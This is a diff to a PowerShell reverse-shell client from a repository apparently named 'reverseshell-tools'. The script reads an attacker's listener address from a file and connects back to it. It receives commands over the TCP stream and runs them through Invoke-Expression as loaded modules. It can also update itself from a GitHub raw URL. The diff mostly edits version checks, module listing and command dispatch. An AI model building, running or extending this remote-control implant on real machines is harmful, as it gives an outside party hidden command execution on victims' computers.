@@ -1,4 +1,4 @@
-﻿#1.0
+#1.0.1
 
 try { Get-Content -Path ((Get-Item $PSCommandPath).DirectoryName + "\listener.txt") -ErrorAction Stop | ForEach-Object { $server = $_ } }
 catch
@@ -154,12 +154,12 @@ function RunModule ($Action)
 			}
 		}
 		
-		if ($SplitAction[1] -notin @("store", "installed", "add", "remove")) { WriteTCPMessage "`nInvalid Command!`n" }
+		if ($SplitAction[1] -notin @("store", "list", "add", "remove")) { WriteTCPMessage "`nInvalid Command!`n" }
 	}
 	#/ver
 	if ($SplitAction[0] -eq "ver")
 	{
-		if ($SplitAction[1] -eq $null) { WriteTCPMessage ("`nVersion: " + (Get-Content $PSCommandPath -TotalCount 1).Substring(1) + "`nNewest: " + (([string](Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UltraAlex00/reverseshell-tools/main/rs.ps1").Content).Split()[0]).Substring(2) + "`n") }
+		if ($SplitAction[1] -eq $null) { WriteTCPMessage ("`nVersion: " + (Get-Content $PSCommandPath -TotalCount 1).Substring(1) + "`nNewest: " + (([string](Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UltraAlex00/reverseshell-tools/main/active.ps1").Content).Split()[0]).Substring(2) + "`n") }
 		elseif ($SplitAction[1] -eq "update")
 		{
 			try
@@ -221,29 +221,24 @@ Internal:
 
 External:
 " -NoCommand
-			foreach ($moduleindex in $loadedmodules.Keys)
-			{
-				WriteTCPMessage ("/" + $moduleindex + " " + $loadedmodules[$moduleindex]) -NoCommand
-			}
-			WriteTCPMessage "`n"
+			WriteTCPMessage ((Invoke-Command { foreach ($moduleindex in $loadedmodules.Keys) { ("`n/" + $moduleindex + " " + $loadedmodules[$moduleindex]) } } ) + "`n")
 		}
 		else
 		{
-			try { WriteTCPMessage ("`n/" + $SplitAction[0] + " " + $loadedmodules[$SplitAction[1]] + "`n") }
+			try { WriteTCPMessage ("`n/" + $SplitAction[1] + " " + $loadedmodules[$SplitAction[1]] + "`n") }
 			catch { WriteTCPMessage "Module Not Found!`n" }
 		}
-	}
-	#loaded modules
-	if ($SplitAction[0] -notin @("server", "module", "ver", "help", "restart"))
-	{
-		if ($SplitAction[0] -in $loadedmodules.Keys)
+		#loaded modules
+		if ($SplitAction[0] -notin @("server", "module", "ver", "help", "restart"))
 		{
-			Invoke-Expression ([string]$SplitAction)
+			if ($SplitAction[0] -in $loadedmodules.Keys)
+			{
+				Invoke-Expression ([string]$SplitAction)
+			}
+			else { WriteTCPMessage "`nInvalid Command!`n" }
 		}
-		else { WriteTCPMessage "`nInvalid Command!`n" }
 	}
 }
-
 WriteTCPMessage ''
 
 while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)
